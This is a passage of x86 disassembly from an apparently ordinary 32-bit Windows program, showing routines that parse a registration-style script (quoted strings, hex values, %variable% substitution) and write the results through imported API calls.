  402828:	pop    esi
  402829:	pop    ebp
  40282a:	ret    0x4
  40282d:	int3   
  40282e:	int3   
  40282f:	int3   
  402830:	int3   
  402831:	int3   
  402832:	mov    edi,edi
  402834:	push   ebp
  402835:	mov    ebp,esp
  402837:	push   ecx
  402838:	push   ebx
  402839:	push   esi
  40283a:	push   edi
  40283b:	mov    edi,ecx
  40283d:	lea    eax,[edi+0x10]
  402840:	push   eax
  402841:	mov    DWORD PTR [ebp-0x4],eax
  402844:	call   DWORD PTR ds:0x40810c
  40284a:	xor    ebx,ebx
  40284c:	mov    esi,ebx
  40284e:	cmp    DWORD PTR [edi+0xc],ebx
  402851:	jle    0x40286c
  402853:	mov    eax,DWORD PTR [edi+0x4]
  402856:	push   DWORD PTR [ebp+0x8]
  402859:	push   DWORD PTR [eax+esi*4]
  40285c:	call   DWORD PTR ds:0x4080fc
  402862:	test   eax,eax
  402864:	je     0x40286f
  402866:	inc    esi
  402867:	cmp    esi,DWORD PTR [edi+0xc]
  40286a:	jl     0x402853
  40286c:	or     esi,0xffffffff
  40286f:	cmp    esi,0xffffffff
  402872:	je     0x402883
  402874:	test   esi,esi
  402876:	js     0x402897
  402878:	cmp    esi,DWORD PTR [edi+0xc]
  40287b:	jge    0x402897
  40287d:	mov    eax,DWORD PTR [edi+0x8]
  402880:	mov    ebx,DWORD PTR [eax+esi*4]
  402883:	push   DWORD PTR [ebp-0x4]
  402886:	call   DWORD PTR ds:0x408108
  40288c:	pop    edi
  40288d:	pop    esi
  40288e:	mov    eax,ebx
  402890:	pop    ebx
  402891:	mov    esp,ebp
  402893:	pop    ebp
  402894:	ret    0x4
  402897:	mov    ecx,0xc000008c
  40289c:	call   0x401cc2
  4028a1:	int3   
  4028a2:	int3   
  4028a3:	int3   
  4028a4:	int3   
  4028a5:	int3   
  4028a6:	int3   
  4028a7:	mov    eax,ds:0x4074ec
  4028ac:	push   ebx
  4028ad:	mov    ebx,edx
  4028af:	push   esi
  4028b0:	push   edi
  4028b1:	mov    edi,ecx
  4028b3:	test   al,0x1
  4028b5:	jne    0x40290d
  4028b7:	or     eax,0x1
  4028ba:	mov    DWORD PTR ds:0x407590,0x4011d8
  4028c4:	push   0x8
  4028c6:	mov    ds:0x4074ec,eax
  4028cb:	pop    eax
  4028cc:	mov    ds:0x407594,ax
  4028d2:	mov    eax,0x4008
  4028d7:	push   0x13
  4028d9:	mov    ds:0x40759c,ax
  4028df:	pop    eax
  4028e0:	push   0x11
  4028e2:	mov    ds:0x4075a4,ax
  4028e8:	pop    eax
  4028e9:	mov    DWORD PTR ds:0x407598,0x4011dc
  4028f3:	mov    DWORD PTR ds:0x4075a0,0x4011e0
  4028fd:	mov    DWORD PTR ds:0x4075a8,0x4011e4
  402907:	mov    ds:0x4075ac,ax
  40290d:	xor    esi,esi
  40290f:	push   DWORD PTR [esi*8+0x407590]
  402916:	push   edi
  402917:	call   DWORD PTR ds:0x4080fc
  40291d:	test   eax,eax
  40291f:	je     0x40292b
  402921:	inc    esi
  402922:	cmp    esi,0x4
  402925:	jb     0x40290f
  402927:	xor    eax,eax
  402929:	jmp    0x402939
  40292b:	mov    cx,WORD PTR [esi*8+0x407594]
  402933:	xor    eax,eax
  402935:	mov    WORD PTR [ebx],cx
  402938:	inc    eax
  402939:	pop    edi
  40293a:	pop    esi
  40293b:	pop    ebx
  40293c:	ret    
  40293d:	int3   
  40293e:	int3   
  40293f:	int3   
  402940:	int3   
  402941:	int3   
  402942:	mov    edi,edi
  402944:	push   esi
  402945:	mov    eax,ecx
  402947:	xor    esi,esi
  402949:	push   edi
  40294a:	mov    di,dx
  40294d:	test   eax,eax
  40294f:	jne    0x40295f
  402951:	jmp    0x40296d
  402953:	cmp    cx,di
  402956:	je     0x402969
  402958:	push   eax
  402959:	call   DWORD PTR ds:0x4080f4
  40295f:	movzx  ecx,WORD PTR [eax]
  402962:	test   cx,cx
  402965:	jne    0x402953
  402967:	jmp    0x40296b
  402969:	mov    esi,eax
  40296b:	mov    eax,esi
  40296d:	pop    edi
  40296e:	pop    esi
  40296f:	ret    
  402970:	int3   
  402971:	int3   
  402972:	int3   
  402973:	int3   
  402974:	int3   
  402975:	mov    edi,edi
  402977:	push   esi
  402978:	mov    esi,ecx
  40297a:	mov    ecx,DWORD PTR [esi]
  40297c:	movzx  eax,WORD PTR [ecx]
  40297f:	cmp    eax,0x9
  402982:	jl     0x40299e
  402984:	cmp    eax,0xa
  402987:	jle    0x402993
  402989:	cmp    eax,0xd
  40298c:	je     0x402993
  40298e:	cmp    eax,0x20
  402991:	jne    0x40299e
  402993:	push   ecx
  402994:	call   DWORD PTR ds:0x4080f4
  40299a:	mov    DWORD PTR [esi],eax
  40299c:	jmp    0x40297a
  40299e:	pop    esi
  40299f:	ret    
  4029a0:	int3   
  4029a1:	int3   
  4029a2:	int3   
  4029a3:	int3   
  4029a4:	int3   
  4029a5:	mov    edi,edi
  4029a7:	push   ebp
  4029a8:	mov    ebp,esp
  4029aa:	push   ecx
  4029ab:	push   edi
  4029ac:	mov    edi,ecx
  4029ae:	call   0x402975
  4029b3:	mov    ecx,DWORD PTR [edi]
  4029b5:	xor    edx,edx
  4029b7:	movzx  eax,WORD PTR [ecx]
  4029ba:	cmp    dx,ax
  4029bd:	jne    0x4029c9
  4029bf:	mov    eax,0x80020009
  4029c4:	jmp    0x402ade
  4029c9:	push   ebx
  4029ca:	push   esi
  4029cb:	mov    esi,DWORD PTR [ebp+0x8]
  4029ce:	push   0x27
  4029d0:	pop    edx
  4029d1:	lea    ebx,[esi+0x2000]
  4029d7:	mov    DWORD PTR [ebp-0x4],ebx
  4029da:	cmp    dx,ax
  4029dd:	jne    0x402a78
  4029e3:	push   ecx
  4029e4:	call   DWORD PTR ds:0x4080f4
  4029ea:	xor    ecx,ecx
  4029ec:	mov    DWORD PTR [edi],eax
  4029ee:	cmp    cx,WORD PTR [eax]
  4029f1:	je     0x402a5a
  4029f3:	mov    eax,DWORD PTR [edi]
  4029f5:	push   0x27
  4029f7:	pop    ebx
  4029f8:	cmp    bx,WORD PTR [eax]
  4029fb:	jne    0x402a09
  4029fd:	push   eax
  4029fe:	call   DWORD PTR ds:0x4080f4
  402a04:	cmp    bx,WORD PTR [eax]
  402a07:	jne    0x402a57
  402a09:	mov    eax,DWORD PTR [edi]
  402a0b:	cmp    bx,WORD PTR [eax]
  402a0e:	jne    0x402a19
  402a10:	push   eax
  402a11:	call   DWORD PTR ds:0x4080f4
  402a17:	mov    DWORD PTR [edi],eax
  402a19:	mov    ebx,DWORD PTR [edi]
  402a1b:	push   ebx
  402a1c:	call   DWORD PTR ds:0x4080f4
  402a22:	mov    edx,eax
  402a24:	mov    DWORD PTR [edi],edx
  402a26:	sub    edx,ebx
  402a28:	sar    edx,1
  402a2a:	lea    ecx,[edx+0x1]
  402a2d:	lea    ecx,[esi+ecx*2]
  402a30:	cmp    ecx,DWORD PTR [ebp-0x4]
  402a33:	jae    0x402ad7
  402a39:	test   edx,edx
  402a3b:	jle    0x402a4e
  402a3d:	sub    ebx,esi
  402a3f:	mov    ax,WORD PTR [ebx+esi*1]
  402a43:	mov    WORD PTR [esi],ax
  402a46:	add    esi,0x2
  402a49:	sub    edx,0x1
  402a4c:	jne    0x402a3f
  402a4e:	mov    eax,DWORD PTR [edi]
  402a50:	xor    ecx,ecx
  402a52:	cmp    cx,WORD PTR [eax]
  402a55:	jne    0x4029f3
  402a57:	mov    ebx,DWORD PTR [ebp-0x4]
  402a5a:	mov    eax,DWORD PTR [edi]
  402a5c:	xor    ecx,ecx
  402a5e:	cmp    cx,WORD PTR [eax]
  402a61:	je     0x402ad7
  402a63:	cmp    esi,ebx
  402a65:	jae    0x402ad7
  402a67:	xor    eax,eax
  402a69:	mov    WORD PTR [esi],ax
  402a6c:	push   DWORD PTR [edi]
  402a6e:	call   DWORD PTR ds:0x4080f4
  402a74:	mov    DWORD PTR [edi],eax
  402a76:	jmp    0x402ad3
  402a78:	mov    ebx,DWORD PTR [edi]
  402a7a:	movzx  eax,WORD PTR [ebx]
  402a7d:	cmp    eax,0x9
  402a80:	jl     0x402a91
  402a82:	cmp    eax,0xa
  402a85:	jle    0x402ac9
  402a87:	cmp    eax,0xd
  402a8a:	je     0x402ac9
  402a8c:	cmp    eax,0x20
  402a8f:	je     0x402ac9
  402a91:	push   ebx
  402a92:	call   DWORD PTR ds:0x4080f4
  402a98:	mov    edx,eax
  402a9a:	mov    DWORD PTR [edi],edx
  402a9c:	sub    edx,ebx
  402a9e:	sar    edx,1
  402aa0:	lea    ecx,[edx+0x1]
  402aa3:	lea    ecx,[esi+ecx*2]
  402aa6:	cmp    ecx,DWORD PTR [ebp-0x4]
  402aa9:	jae    0x402ad7
  402aab:	test   edx,edx
  402aad:	jle    0x402ac0
  402aaf:	sub    ebx,esi
  402ab1:	mov    ax,WORD PTR [ebx+esi*1]
  402ab5:	mov    WORD PTR [esi],ax
  402ab8:	add    esi,0x2
  402abb:	sub    edx,0x1
  402abe:	jne    0x402ab1
  402ac0:	mov    eax,DWORD PTR [edi]
  402ac2:	xor    ecx,ecx
  402ac4:	cmp    cx,WORD PTR [eax]
  402ac7:	jne    0x402a78
  402ac9:	cmp    esi,DWORD PTR [ebp-0x4]
  402acc:	jae    0x402ad7
  402ace:	xor    eax,eax
  402ad0:	mov    WORD PTR [esi],ax
  402ad3:	xor    eax,eax
  402ad5:	jmp    0x402adc
  402ad7:	mov    eax,0x80020009
  402adc:	pop    esi
  402add:	pop    ebx
  402ade:	pop    edi
  402adf:	mov    esp,ebp
  402ae1:	pop    ebp
  402ae2:	ret    0x4
  402ae5:	int3   
  402ae6:	int3   
  402ae7:	int3   
  402ae8:	int3   
  402ae9:	int3   
  402aea:	mov    edi,edi
  402aec:	push   ebp
  402aed:	mov    ebp,esp
  402aef:	push   0xffffffff
  402af1:	push   0x405cf7
  402af6:	mov    eax,fs:0x0
  402afc:	push   eax
  402afd:	push   ecx
  402afe:	mov    eax,0x2128
  402b03:	call   0x405bb0
  402b08:	mov    eax,ds:0x40700c
  402b0d:	xor    eax,ebp
  402b0f:	mov    DWORD PTR [ebp-0x14],eax
  402b12:	push   ebx
  402b13:	push   esi
  402b14:	push   edi
  402b15:	push   eax
  402b16:	lea    eax,[ebp-0xc]
  402b19:	mov    fs:0x0,eax
  402b1f:	mov    DWORD PTR [ebp-0x10],esp
  402b22:	mov    esi,ecx
  402b24:	mov    DWORD PTR [ebp-0x2120],esi
  402b2a:	mov    eax,DWORD PTR [ebp+0x8]
  402b2d:	mov    DWORD PTR [ebp-0x2124],eax
  402b33:	mov    eax,DWORD PTR [ebp+0xc]
  402b36:	mov    DWORD PTR [ebp-0x2128],eax
  402b3c:	mov    eax,DWORD PTR [ebp+0x10]
  402b3f:	mov    DWORD PTR [ebp-0x2138],eax
  402b45:	xor    eax,eax
  402b47:	mov    WORD PTR [ebp-0x211c],ax
  402b4e:	lea    eax,[ebp-0x2014]
  402b54:	push   eax
  402b55:	mov    DWORD PTR [ebp-0x212c],esi
  402b5b:	call   0x4029a5
  402b60:	test   eax,eax
  402b62:	js     0x402f62
  402b68:	lea    edx,[ebp-0x211c]
  402b6e:	lea    ecx,[ebp-0x2014]
  402b74:	call   0x4028a7
  402b79:	test   eax,eax
  402b7b:	jne    0x402b87
  402b7d:	mov    eax,0x80020009
  402b82:	jmp    0x402f62
  402b87:	mov    ecx,esi
  402b89:	call   0x402975
  402b8e:	lea    eax,[ebp-0x2014]
  402b94:	mov    ecx,esi
  402b96:	push   eax
  402b97:	call   0x4029a5
  402b9c:	test   eax,eax
  402b9e:	js     0x402f62
  402ba4:	movzx  eax,WORD PTR [ebp-0x211c]
  402bab:	push   0x2
  402bad:	pop    edi
  402bae:	sub    eax,0x8
  402bb1:	je     0x402f09
  402bb7:	sub    eax,0x9
  402bba:	je     0x402d68
  402bc0:	sub    eax,edi
  402bc2:	je     0x402d0f
  402bc8:	sub    eax,0x3ff5
  402bcd:	jne    0x402f4f
  402bd3:	lea    ecx,[ebp-0x2014]
  402bd9:	xor    ebx,ebx
  402bdb:	lea    edx,[ecx+0x2]
  402bde:	mov    ax,WORD PTR [ecx]
  402be1:	add    ecx,edi
  402be3:	cmp    ax,bx
  402be6:	jne    0x402bde
  402be8:	sub    ecx,edx
  402bea:	mov    DWORD PTR [ebp-0x2118],ebx
  402bf0:	sar    ecx,1
  402bf2:	lea    eax,[ecx+0x2]
  402bf5:	mul    edi
  402bf7:	mov    DWORD PTR [ebp-0x4],ebx
  402bfa:	mov    BYTE PTR [ebp-0x4],0x1
  402bfe:	cmp    edx,ebx
  402c00:	ja     0x402c33
  402c02:	cmp    eax,0xffffffff
  402c05:	ja     0x402c33
  402c07:	cmp    eax,0x100
  402c0c:	jbe    0x402c22
  402c0e:	push   eax
  402c0f:	lea    ecx,[ebp-0x2118]
  402c15:	call   0x404769
  402c1a:	mov    esi,DWORD PTR [ebp-0x2118]
  402c20:	jmp    0x402c2e
  402c22:	lea    esi,[ebp-0x2114]
  402c28:	mov    DWORD PTR [ebp-0x2118],esi
  402c2e:	mov    DWORD PTR [ebp-0x4],ebx
  402c31:	jmp    0x402c5d
  402c33:	mov    ecx,0x80070057
  402c38:	call   0x401cea
  402c3d:	mov    eax,0x402c43
  402c42:	ret    
  402c43:	xor    ebx,ebx
  402c45:	mov    DWORD PTR [ebp-0x4],ebx
  402c48:	mov    ecx,DWORD PTR [ebp-0x212c]
  402c4e:	mov    esi,DWORD PTR [ebp-0x2118]
  402c54:	push   0x2
  402c56:	pop    edi
  402c57:	mov    DWORD PTR [ebp-0x2120],ecx
  402c5d:	test   esi,esi
  402c5f:	je     0x402cdd
  402c61:	cmp    WORD PTR [ebp-0x2014],0x0
  402c69:	lea    eax,[ebp-0x2014]
  402c6f:	mov    DWORD PTR [ebp-0x211c],eax
  402c75:	je     0x402cb8
  402c77:	push   eax
  402c78:	call   DWORD PTR ds:0x4080f4
  402c7e:	mov    ecx,eax
  402c80:	mov    eax,DWORD PTR [ebp-0x211c]
  402c86:	movzx  edx,WORD PTR [eax]
  402c89:	cmp    edx,0x5c
  402c8c:	jne    0x402cac
  402c8e:	push   0x30
  402c90:	pop    eax
  402c91:	cmp    WORD PTR [ecx],ax
  402c94:	mov    eax,DWORD PTR [ebp-0x211c]
  402c9a:	jne    0x402cac
  402c9c:	xor    eax,eax
  402c9e:	mov    WORD PTR [esi],ax
  402ca1:	add    esi,edi
  402ca3:	push   ecx
  402ca4:	call   DWORD PTR ds:0x4080f4
  402caa:	jmp    0x402cb3
  402cac:	mov    WORD PTR [esi],dx
  402caf:	add    esi,edi
  402cb1:	add    eax,edi
  402cb3:	cmp    WORD PTR [eax],bx
  402cb6:	jmp    0x402c6f
  402cb8:	mov    ecx,DWORD PTR [ebp-0x2124]
  402cbe:	xor    eax,eax
  402cc0:	mov    DWORD PTR [esi],eax
  402cc2:	push   DWORD PTR [ebp-0x2118]
  402cc8:	push   DWORD PTR [ebp-0x2128]
  402cce:	call   0x402079
  402cd3:	mov    esi,DWORD PTR [ebp-0x2118]
  402cd9:	mov    edi,eax
  402cdb:	jmp    0x402ce0
  402cdd:	push   0xe
  402cdf:	pop    edi
  402ce0:	lea    eax,[ebp-0x2114]
  402ce6:	cmp    esi,eax
  402ce8:	je     0x402cf5
  402cea:	lea    ecx,[ebp-0x2118]
  402cf0:	call   0x40475a
  402cf5:	mov    esi,DWORD PTR [ebp-0x2120]
  402cfb:	test   edi,edi
  402cfd:	je     0x402f4f
  402d03:	mov    ecx,edi
  402d05:	call   0x401daf
  402d0a:	jmp    0x402f62
  402d0f:	lea    eax,[ebp-0x2130]
  402d15:	xor    ebx,ebx
  402d17:	push   eax
  402d18:	push   ebx
  402d19:	push   ebx
  402d1a:	lea    eax,[ebp-0x2014]
  402d20:	mov    DWORD PTR [ebp-0x2120],ebx
  402d26:	push   eax
  402d27:	call   DWORD PTR ds:0x408000
  402d2d:	mov    eax,DWORD PTR [ebp-0x2130]
  402d33:	push   0x4
  402d35:	mov    DWORD PTR [ebp-0x212c],eax
  402d3b:	lea    eax,[ebp-0x212c]
  402d41:	push   eax
  402d42:	mov    eax,DWORD PTR [ebp-0x2124]
  402d48:	push   0x4
  402d4a:	push   ebx
  402d4b:	push   DWORD PTR [ebp-0x2128]
  402d51:	push   DWORD PTR [eax]
  402d53:	call   DWORD PTR ds:0x4080bc
  402d59:	lea    ecx,[ebp-0x2120]
  402d5f:	mov    edi,eax
  402d61:	call   0x40461f
  402d66:	jmp    0x402cfb
  402d68:	lea    ecx,[ebp-0x2014]
  402d6e:	xor    ebx,ebx
  402d70:	lea    edx,[ecx+0x2]
  402d73:	mov    ax,WORD PTR [ecx]
  402d76:	add    ecx,edi
  402d78:	cmp    ax,bx
  402d7b:	jne    0x402d73
  402d7d:	sub    ecx,edx
  402d7f:	sar    ecx,1
  402d81:	mov    DWORD PTR [ebp-0x211c],ecx
  402d87:	mov    DWORD PTR [ebp-0x2134],ecx
  402d8d:	test   cl,0x1
  402d90:	je     0x402d9c
  402d92:	mov    eax,0x80004005
  402d97:	jmp    0x402f62
  402d9c:	mov    eax,ecx
  402d9e:	mov    DWORD PTR [ebp-0x2118],ebx
  402da4:	cdq    
  402da5:	sub    eax,edx
  402da7:	mov    edi,eax
  402da9:	sar    edi,1
  402dab:	mov    DWORD PTR [ebp-0x2130],edi
  402db1:	mov    DWORD PTR [ebp-0x4],0x3
  402db8:	mov    BYTE PTR [ebp-0x4],0x4
  402dbc:	cmp    ebx,ebx
  402dbe:	ja     0x402c33
  402dc4:	cmp    edi,0xffffffff
  402dc7:	ja     0x402c33
  402dcd:	cmp    edi,0x100
  402dd3:	jbe    0x402de9
  402dd5:	push   edi
  402dd6:	lea    ecx,[ebp-0x2118]
  402ddc:	call   0x404769
  402de1:	mov    esi,DWORD PTR [ebp-0x211c]
  402de7:	jmp    0x402e1d
  402de9:	mov    esi,DWORD PTR [ebp-0x211c]
  402def:	lea    eax,[ebp-0x2114]
  402df5:	mov    DWORD PTR [ebp-0x2118],eax
  402dfb:	jmp    0x402e23
  402dfd:	mov    eax,0x402e03
  402e02:	ret    
  402e03:	mov    ecx,DWORD PTR [ebp-0x212c]
  402e09:	xor    ebx,ebx
  402e0b:	mov    esi,DWORD PTR [ebp-0x2134]
  402e11:	mov    edi,DWORD PTR [ebp-0x2130]
  402e17:	mov    DWORD PTR [ebp-0x2120],ecx
  402e1d:	mov    eax,DWORD PTR [ebp-0x2118]
  402e23:	test   eax,eax
  402e25:	jne    0x402e45
  402e27:	lea    eax,[ebp-0x2114]
  402e2d:	test   eax,eax
  402e2f:	je     0x402d92
  402e35:	lea    ecx,[ebp-0x2118]
  402e3b:	call   0x40475a
  402e40:	jmp    0x402d92
  402e45:	push   edi
  402e46:	push   ebx
  402e47:	push   eax
  402e48:	call   0x4054b8
  402e4d:	add    esp,0xc
  402e50:	test   esi,esi
  402e52:	jle    0x402ec7
  402e54:	push   0x30
  402e56:	pop    ecx
  402e57:	mov    edi,ebx
  402e59:	mov    eax,edi
  402e5b:	cdq    
  402e5c:	sub    eax,edx
  402e5e:	movzx  edx,WORD PTR [ebp+edi*2-0x2014]
  402e66:	sar    eax,1
  402e68:	add    eax,DWORD PTR [ebp-0x2118]
  402e6e:	mov    DWORD PTR [ebp-0x2134],eax
  402e74:	mov    eax,edx
  402e76:	cmp    eax,ecx
  402e78:	jl     0x402ea0
  402e7a:	cmp    eax,0x39
  402e7d:	jle    0x402e9b
  402e7f:	cmp    eax,0x40
  402e82:	jle    0x402ea0
  402e84:	cmp    eax,0x46
  402e87:	jle    0x402e96
  402e89:	add    eax,0xffffff9f
  402e8c:	cmp    eax,0x5
  402e8f:	ja     0x402ea0
  402e91:	sub    dl,0x57
  402e94:	jmp    0x402ea2
  402e96:	sub    dl,0x37
  402e99:	jmp    0x402ea2
  402e9b:	sub    dl,0x30
  402e9e:	jmp    0x402ea2
  402ea0:	mov    dl,bl
  402ea2:	mov    eax,edi
  402ea4:	and    eax,0x1
  402ea7:	push   0x4
  402ea9:	shl    eax,0x2
  402eac:	pop    ecx
  402ead:	sub    ecx,eax
  402eaf:	mov    eax,DWORD PTR [ebp-0x2134]
  402eb5:	shl    dl,cl
  402eb7:	push   0x30
  402eb9:	pop    ecx
  402eba:	or     BYTE PTR [eax],dl
  402ebc:	inc    edi
  402ebd:	cmp    edi,esi
  402ebf:	jl     0x402e59
  402ec1:	mov    edi,DWORD PTR [ebp-0x2130]
  402ec7:	mov    eax,DWORD PTR [ebp-0x2124]
  402ecd:	push   edi
  402ece:	push   DWORD PTR [ebp-0x2118]
  402ed4:	push   0x3
  402ed6:	push   ebx
  402ed7:	push   DWORD PTR [ebp-0x2128]
  402edd:	push   DWORD PTR [eax]
  402edf:	call   DWORD PTR ds:0x4080bc
  402ee5:	mov    edi,eax
  402ee7:	lea    eax,[ebp-0x2114]
  402eed:	cmp    DWORD PTR [ebp-0x2118],eax
  402ef3:	je     0x402cf5
  402ef9:	lea    ecx,[ebp-0x2118]
  402eff:	call   0x40475a
  402f04:	jmp    0x402cf5
  402f09:	lea    ecx,[ebp-0x2014]
  402f0f:	xor    ebx,ebx
  402f11:	lea    edx,[ecx+0x2]
  402f14:	mov    ax,WORD PTR [ecx]
  402f17:	add    ecx,edi
  402f19:	cmp    ax,bx
  402f1c:	jne    0x402f14
  402f1e:	sub    ecx,edx
  402f20:	sar    ecx,1
  402f22:	lea    eax,[ecx*2+0x2]
  402f29:	push   eax
  402f2a:	lea    eax,[ebp-0x2014]
  402f30:	push   eax
  402f31:	mov    eax,DWORD PTR [ebp-0x2124]
  402f37:	push   0x1
  402f39:	push   ebx
  402f3a:	push   DWORD PTR [ebp-0x2128]
  402f40:	push   DWORD PTR [eax]
  402f42:	call   DWORD PTR ds:0x4080bc
  402f48:	mov    edi,eax
  402f4a:	jmp    0x402cfb
  402f4f:	push   DWORD PTR [ebp-0x2138]
  402f55:	mov    ecx,esi
  402f57:	call   0x4029a5
  402f5c:	test   eax,eax
  402f5e:	js     0x402f62
  402f60:	xor    eax,eax
  402f62:	mov    ecx,DWORD PTR [ebp-0xc]
  402f65:	mov    DWORD PTR fs:0x0,ecx
  402f6c:	pop    ecx
  402f6d:	pop    edi
  402f6e:	pop    esi
  402f6f:	pop    ebx
  402f70:	mov    ecx,DWORD PTR [ebp-0x14]
  402f73:	xor    ecx,ebp
  402f75:	call   0x405170
  402f7a:	mov    esp,ebp
  402f7c:	pop    ebp
  402f7d:	ret    0xc
  402f80:	int3   
  402f81:	int3   
  402f82:	int3   
  402f83:	int3   
  402f84:	int3   
  402f85:	mov    edi,edi
  402f87:	push   ebp
  402f88:	mov    ebp,esp
  402f8a:	push   esi
  402f8b:	mov    esi,0x401600
  402f90:	push   DWORD PTR [esi]
  402f92:	push   DWORD PTR [ebp+0x8]
  402f95:	call   DWORD PTR ds:0x4080fc
  402f9b:	test   eax,eax
  402f9d:	je     0x402faf
  402f9f:	add    esi,0x4
  402fa2:	cmp    esi,0x401630
  402fa8:	jl     0x402f90
  402faa:	xor    eax,eax
  402fac:	inc    eax
  402fad:	jmp    0x402fb1
  402faf:	xor    eax,eax
  402fb1:	pop    esi
  402fb2:	pop    ebp
  402fb3:	ret    0x4
  402fb6:	int3   
  402fb7:	int3   
  402fb8:	int3   
  402fb9:	int3   
  402fba:	int3   
  402fbb:	mov    edi,edi
  402fbd:	push   ebp
  402fbe:	mov    ebp,esp
  402fc0:	push   ecx
  402fc1:	xor    ecx,ecx
  402fc3:	lea    eax,[ebp-0x4]
  402fc6:	push   ecx
  402fc7:	push   ecx
  402fc8:	push   ecx
  402fc9:	push   ecx
  402fca:	push   ecx
  402fcb:	push   ecx
  402fcc:	push   ecx
  402fcd:	push   eax
  402fce:	push   ecx
  402fcf:	push   ecx
  402fd0:	push   ecx
  402fd1:	push   DWORD PTR [ebp+0x8]
  402fd4:	mov    DWORD PTR [ebp-0x4],ecx
  402fd7:	call   DWORD PTR ds:0x4080c0
  402fdd:	test   eax,eax
  402fdf:	je     0x402fe5
  402fe1:	xor    eax,eax
  402fe3:	jmp    0x402fee
  402fe5:	xor    eax,eax
  402fe7:	cmp    eax,DWORD PTR [ebp-0x4]
  402fea:	sbb    eax,eax
  402fec:	neg    eax
  402fee:	mov    esp,ebp
  402ff0:	pop    ebp
  402ff1:	ret    0x4
  402ff4:	int3   
  402ff5:	int3   
  402ff6:	int3   
  402ff7:	int3   
  402ff8:	int3   
  402ff9:	mov    edi,edi
  402ffb:	push   ebp
  402ffc:	mov    ebp,esp
  402ffe:	mov    eax,0x2004
  403003:	call   0x405bb0
  403008:	mov    eax,ds:0x40700c
  40300d:	xor    eax,ebp
  40300f:	mov    DWORD PTR [ebp-0x4],eax
  403012:	push   esi
  403013:	push   edi
  403014:	mov    edi,DWORD PTR [ebp+0x8]
  403017:	mov    esi,ecx
  403019:	cmp    WORD PTR [edi],0x3d
  40301d:	jne    0x40304e
  40301f:	push   edi
  403020:	call   0x4029a5
  403025:	test   eax,eax
  403027:	js     0x403050
  403029:	mov    ecx,esi
  40302b:	call   0x402975
  403030:	lea    eax,[ebp-0x2004]
  403036:	mov    ecx,esi
  403038:	push   eax
  403039:	call   0x4029a5
  40303e:	test   eax,eax
  403040:	js     0x403050
  403042:	push   edi
  403043:	mov    ecx,esi
  403045:	call   0x4029a5
  40304a:	test   eax,eax
  40304c:	js     0x403050
  40304e:	xor    eax,eax
  403050:	mov    ecx,DWORD PTR [ebp-0x4]
  403053:	pop    edi
  403054:	xor    ecx,ebp
  403056:	pop    esi
  403057:	call   0x405170
  40305c:	mov    esp,ebp
  40305e:	pop    ebp
  40305f:	ret    0x4
  403062:	int3   
  403063:	int3   
  403064:	int3   
  403065:	int3   
  403066:	int3   
  403067:	push   0x5c
  403069:	mov    eax,0x405d34
  40306e:	call   0x405aea
  403073:	mov    edi,ecx
  403075:	mov    esi,DWORD PTR [ebp+0x8]
  403078:	mov    eax,DWORD PTR [ebp+0xc]
  40307b:	mov    DWORD PTR [ebp-0x60],eax
  40307e:	test   esi,esi
  403080:	je     0x403206
  403086:	test   eax,eax
  403088:	je     0x403206
  40308e:	mov    ecx,esi
  403090:	xor    ebx,ebx
  403092:	mov    DWORD PTR [eax],ebx
  403094:	lea    edx,[ecx+0x2]
  403097:	mov    ax,WORD PTR [ecx]
  40309a:	add    ecx,0x2
  40309d:	cmp    ax,bx
  4030a0:	jne    0x403097
  4030a2:	sub    ecx,edx
  4030a4:	sar    ecx,1
  4030a6:	lea    eax,[ecx+ecx*1]
  4030a9:	cmp    eax,0x64
  4030ac:	jge    0x4030b3
  4030ae:	mov    eax,0x3e8
  4030b3:	push   0x2
  4030b5:	pop    ecx
  4030b6:	mov    DWORD PTR [ebp-0x58],eax
  4030b9:	mul    ecx
  4030bb:	mov    DWORD PTR [ebp-0x5c],ebx
  4030be:	cmp    edx,ebx
  4030c0:	ja     0x4030dc
  4030c2:	cmp    eax,0xffffffff
  4030c5:	ja     0x4030dc
  4030c7:	push   eax
  4030c8:	call   DWORD PTR ds:0x408028
  4030ce:	mov    DWORD PTR [ebp-0x54],eax
  4030d1:	test   eax,eax
  4030d3:	je     0x4030e1
  4030d5:	xor    ecx,ecx
  4030d7:	mov    WORD PTR [eax],cx
  4030da:	jmp    0x4030e1
  4030dc:	mov    eax,ebx
  4030de:	mov    DWORD PTR [ebp-0x54],eax
  4030e1:	mov    DWORD PTR [ebp-0x4],ebx
  4030e4:	test   eax,eax
  4030e6:	jne    0x4030f2
  4030e8:	mov    ebx,0x8007000e
  4030ed:	jmp    0x4031eb
  4030f2:	mov    DWORD PTR [edi],esi
  4030f4:	cmp    WORD PTR [esi],bx
  4030f7:	je     0x4031e0
  4030fd:	push   0x25
  4030ff:	pop    esi
  403100:	mov    eax,DWORD PTR [edi]
  403102:	cmp    WORD PTR [eax],si
  403105:	jne    0x403115
  403107:	push   eax
  403108:	call   DWORD PTR ds:0x4080f4
  40310e:	mov    DWORD PTR [edi],eax
  403110:	cmp    WORD PTR [eax],si
  403113:	jne    0x403129
  403115:	push   0x1
  403117:	push   eax
  403118:	lea    ecx,[ebp-0x5c]
  40311b:	call   0x402420
  403120:	test   eax,eax
  403122:	je     0x4030e8
  403124:	jmp    0x4031cd
  403129:	mov    edx,esi
  40312b:	mov    ecx,eax
  40312d:	call   0x402942
  403132:	mov    DWORD PTR [ebp-0x64],eax
  403135:	test   eax,eax
  403137:	je     0x4031ff
  40313d:	mov    ecx,eax
  40313f:	sub    ecx,DWORD PTR [edi]
  403141:	sar    ecx,1
  403143:	cmp    ecx,0x1f
  403146:	jg     0x4031f8
  40314c:	push   ecx
  40314d:	push   DWORD PTR [edi]
  40314f:	lea    eax,[ebp-0x50]
  403152:	push   0x20
  403154:	push   eax
  403155:	call   DWORD PTR ds:0x408154
  40315b:	add    esp,0x10
  40315e:	mov    ecx,eax
  403160:	call   0x401d13
  403165:	mov    ecx,DWORD PTR [edi+0x4]
  403168:	lea    eax,[ebp-0x50]
  40316b:	push   eax
  40316c:	call   0x402832
  403171:	mov    edx,eax
  403173:	test   edx,edx
  403175:	je     0x4031ff
  40317b:	mov    DWORD PTR [ebp-0x68],ebx
  40317e:	mov    ecx,edx
  403180:	mov    BYTE PTR [ebp-0x4],0x1
  403184:	lea    esi,[ecx+0x2]
  403187:	mov    ax,WORD PTR [ecx]
  40318a:	add    ecx,0x2
  40318d:	cmp    ax,bx
  403190:	jne    0x403187
  403192:	sub    ecx,esi
  403194:	sar    ecx,1
  403196:	push   ecx
  403197:	push   edx
  403198:	lea    ecx,[ebp-0x5c]
  40319b:	call   0x402420
  4031a0:	lea    ecx,[ebp-0x68]
